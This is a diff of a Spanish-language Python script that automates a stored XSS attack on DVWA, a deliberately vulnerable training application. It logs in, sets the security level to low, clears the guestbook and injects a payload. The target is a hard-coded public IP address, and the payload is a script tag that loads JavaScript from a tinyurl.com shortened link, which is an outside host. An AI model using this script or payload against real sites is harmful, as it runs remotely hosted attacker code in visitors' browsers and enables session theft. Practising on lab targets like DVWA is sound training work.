@@ -3,9 +3,6 @@ DVWA Stored XSS - Script (login + security low + clear + payload + verificación
 Requisitos:
   pip install requests beautifulsoup4
 Ajusta DVWA_BASE, USER y PASS según tu entorno.
-
-Nota*:
-Hace falta añadir un brute force para inicio de sesión
 """
 
 import sys
@@ -15,20 +12,23 @@ import string
 import requests
 from bs4 import BeautifulSoup
 
-DVWA_BASE = "http://74.179.81.132/dvwa"   # Página a atacar
-USER = "admin"
-PASS = "password"
+# Dirección base del entorno DVWA a atacar
+DVWA_BASE = "http://74.179.81.132/dvwa"
+
+# Credenciales de usuario para DVWA
+USER = ""
+PASS = ""
 
 
-def get_token(html: str) -> str | None:
-    """Extrae el token CSRF (user_token) desde un HTML de DVWA."""
+def get_token(html):
+    """Extrae el token CSRF (user_token) desde un HTML de DVWA"""
     soup = BeautifulSoup(html, "html.parser")
     tok = soup.find("input", {"name": "user_token"})
     return tok["value"] if tok else None
 
 
-def must_have_token(html: str, ctx: str) -> str:
-    """Intenta extraer token y falla con mensaje si no está."""
+def must_have_token(html, ctx):
+    """Obtiene el token o termina el programa si no se encuentra"""
     tok = get_token(html)
     if not tok:
         print(f"No se encontró user_token en {ctx}")
@@ -36,8 +36,8 @@ def must_have_token(html: str, ctx: str) -> str:
     return tok
 
 
-def login(session: requests.Session) -> None:
-    """Inicia sesión en DVWA."""
+def login(session):
+    """Realiza login en DVWA"""
     r = session.get(f"{DVWA_BASE}/login.php", timeout=10)
     token = must_have_token(r.text, "login.php")
 
@@ -46,14 +46,16 @@ def login(session: requests.Session) -> None:
         data={"username": USER, "password": PASS, "Login": "Login", "user_token": token},
         timeout=10,
     )
+
     if "Login failed" in r.text:
         print("Login falló")
         sys.exit(1)
+
     print("Sesión iniciada correctamente")
 
 
-def set_security_low(session: requests.Session) -> None:
-    """Configura el nivel de seguridad en 'low'."""
+def set_security_low(session):
+    """Configura el nivel de seguridad de DVWA en 'low'"""
     r = session.get(f"{DVWA_BASE}/security.php", timeout=10)
     token = must_have_token(r.text, "security.php")
 
@@ -63,15 +65,15 @@ def set_security_low(session: requests.Session) -> None:
         timeout=10,
     )
 
-    # Confirmación flexible (algunas versiones no muestran el texto exacto)
+    # Algunas versiones no confirman el cambio con texto explícito
     if "security level is currently: low" not in r.text.lower():
         session.get(f"{DVWA_BASE}/security.php", timeout=10)
 
     print(f"Security cookie actual: {session.cookies.get('security')}")
 
 
-def clear_guestbook(session: requests.Session, xss_base_url: str) -> None:
-    """Limpia el guestbook (opcional pero recomendable para demo limpia)."""
+def clear_guestbook(session, xss_base_url):
+    """Limpia el guestbook antes de inyectar el payload"""
     r = session.get(xss_base_url, timeout=10)
     token = get_token(r.text)
 
@@ -83,18 +85,18 @@ def clear_guestbook(session: requests.Session, xss_base_url: str) -> None:
     print("Guestbook limpiado")
 
 
-def inject_payload(session: requests.Session, marker: str, payload: str) -> tuple[int, str]:
-    """Inserta el payload XSS en el guestbook y devuelve (status_code, html_respuesta)."""
+def inject_payload(session, marker, payload):
+    """Inyecta el payload XSS y devuelve código de respuesta y URL"""
     xss_url = f"{DVWA_BASE}/vulnerabilities/xss_s/?id={marker}"
     session.headers.update({"User-Agent": f"XSS-Tester/{marker}"})
 
-    # Obtener token de la página de XSS
+    # Obtener token si está presente
     r = session.get(xss_url, timeout=10)
     soup = BeautifulSoup(r.text, "html.parser")
     token_input = soup.find("input", {"name": "user_token"})
     token = token_input["value"] if token_input else None
 
-    # DVWA suele limitar longitudes (<=10 y <=50 aprox.)
+    # Ajustar nombre y mensaje para cumplir con límites de DVWA
     name = f"rt-{marker}"[:10]
     message = payload[:50]
 
@@ -108,8 +110,8 @@ def inject_payload(session: requests.Session, marker: str, payload: str) -> tupl
     return r.status_code, xss_url
 
 
-def verify_injection(session: requests.Session, xss_url: str, marker: str, payload: str) -> None:
-    """Verifica si el payload quedó reflejado y reporta resultados."""
+def verify_injection(session, xss_url, marker, payload):
+    """Verifica si el payload fue insertado correctamente"""
     r = session.get(xss_url, timeout=10)
     html = r.text
 
@@ -125,7 +127,7 @@ def verify_injection(session: requests.Session, xss_url: str, marker: str, paylo
         print("  raw    :", "OK" if hit_raw else "no")
         print("  escaped:", "OK" if hit_esc else "no")
     else:
-        # Búsqueda de último mensaje renderizado como fallback
+        # Fallback: mostrar último mensaje renderizado
         soup = BeautifulSoup(html, "html.parser")
         last = None
         msgs = soup.select("div.message, pre, td")
@@ -138,30 +140,27 @@ def verify_injection(session: requests.Session, xss_url: str, marker: str, paylo
 
 
 def main():
+    """Punto de entrada principal del script"""
     session = requests.Session()
     session.headers.update({"User-Agent": "XSS-Tester"})
 
-    # 1) Login
-    login(session)
+    login(session)  # Paso 1: iniciar sesión
+    set_security_low(session)  # Paso 2: establecer nivel bajo de seguridad
 
-    # 2) Security = low
-    set_security_low(session)
-
-    # 3) Preparar escena (limpiar) e inyectar payload
+    # Paso 3: limpiar e inyectar
     xss_base_url = f"{DVWA_BASE}/vulnerabilities/xss_s/"
     clear_guestbook(session, xss_base_url)
 
-    # Generar marcador único y payload corto
+    # Crear identificador único y payload
     uniq = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
     marker = f"x{uniq}"
-    payload = '<script src=//tinyurl.com/fmujnr6b></script>' # <= debe ser menor a 50 chars
+    payload = '<script src=//tinyurl.com/fmujnr6b></script>'  # <= Máx. 50 caracteres
 
     status, xss_url = inject_payload(session, marker, payload)
 
-    # 4) Verificación
+    # Paso 4: verificación del resultado
     verify_injection(session, xss_url, marker, payload)
 
-    # Info final útil
     print(f"Security cookie final: {session.cookies.get('security')}")
 
 
